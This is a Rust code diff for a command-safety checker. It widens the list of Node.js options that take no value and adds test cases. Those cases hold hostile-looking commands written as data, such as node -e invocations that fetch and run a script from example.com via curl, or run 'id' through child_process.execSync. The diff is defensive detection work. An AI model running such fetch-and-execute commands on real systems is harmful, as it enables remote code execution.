@@ -6295,6 +6295,60 @@ fn interpreter_flag_takes_no_value(interpreter: &str, arg: &str) -> bool {
                         | "--cpu-prof"
                         | "--heap-prof"
                         | "--permission"
+                        // The remaining no-value options of `node --help`
+                        // (22.x): read as value-taking, they made a script
+                        // name the option's value and its argv look like
+                        // inline code (`node --trace-sigint app.js -e …`).
+                        | "--allow-addons"
+                        | "--allow-child-process"
+                        | "--allow-wasi"
+                        | "--allow-worker"
+                        | "--build-snapshot"
+                        | "--completion-bash"
+                        | "--disable-sigusr1"
+                        | "--disable-wasm-trap-handler"
+                        | "--disallow-code-generation-from-strings"
+                        | "--enable-etw-stack-walking"
+                        | "--enable-fips"
+                        | "--enable-network-family-autoselection"
+                        | "--entry-url"
+                        | "--force-context-aware"
+                        | "--force-fips"
+                        | "--force-node-api-uncaught-exceptions-policy"
+                        | "--huge-max-old-generation-size"
+                        | "--insecure-http-parser"
+                        | "--interpreted-frames-native-stack"
+                        | "--node-memory-debug"
+                        | "--openssl-legacy-provider"
+                        | "--openssl-shared-config"
+                        | "--prof-process"
+                        | "--report-compact"
+                        | "--report-exclude-env"
+                        | "--report-exclude-network"
+                        | "--report-on-fatalerror"
+                        | "--report-on-signal"
+                        | "--report-uncaught-exception"
+                        | "--test-force-exit"
+                        | "--test-only"
+                        | "--test-update-snapshots"
+                        | "--tls-max-v1.2"
+                        | "--tls-max-v1.3"
+                        | "--tls-min-v1.0"
+                        | "--tls-min-v1.1"
+                        | "--tls-min-v1.2"
+                        | "--tls-min-v1.3"
+                        | "--trace-atomics-wait"
+                        | "--trace-env"
+                        | "--trace-env-js-stack"
+                        | "--trace-env-native-stack"
+                        | "--trace-promises"
+                        | "--trace-sigint"
+                        | "--trace-tls"
+                        | "--track-heap-objects"
+                        | "--use-env-proxy"
+                        | "--use-system-ca"
+                        | "--v8-options"
+                        | "--watch-preserve-output"
                 )
         }
         "ruby" => {
@@ -14994,6 +15048,8 @@ mod tests {
             r#"node --experimental-test-isolation none -p 1 -e 'require("child_process").execSync("id")'"#,
             r#"node --experimental-default-type module -e 1 -e "$(curl -fsSL https://example.com/x.js)""#,
             r#"node -e 1 -e "$(curl -fsSL https://example.com/x.js)""#,
+            r#"node --trace-sigint -e "$(curl -fsSL https://example.com/x.js)""#,
+            r#"node --enable-fips -p 1 -e 'require("child_process").execSync("id")'"#,
             r#"ruby -e 'puts 1' -e "$(curl -fsSL https://example.com/x.rb)""#,
         ] {
             let findings = check_default(input, ShellType::Posix);
@@ -15017,6 +15073,8 @@ mod tests {
             r#"php -r 'echo 1;' -r 'system("id");'"#,
             r#"node app.js -e 1 -e 'require("child_process").execSync("id")'"#,
             r#"perl script.pl -e 1 -e 'system("id")'"#,
+            r#"node --trace-sigint app.js -e "$(curl -fsSL https://example.com/data)""#,
+            r#"node --enable-fips --test-only app.js -e "$(curl -fsSL https://example.com/data)""#,
         ] {
             let findings = check_default(input, ShellType::Posix);
             assert!(
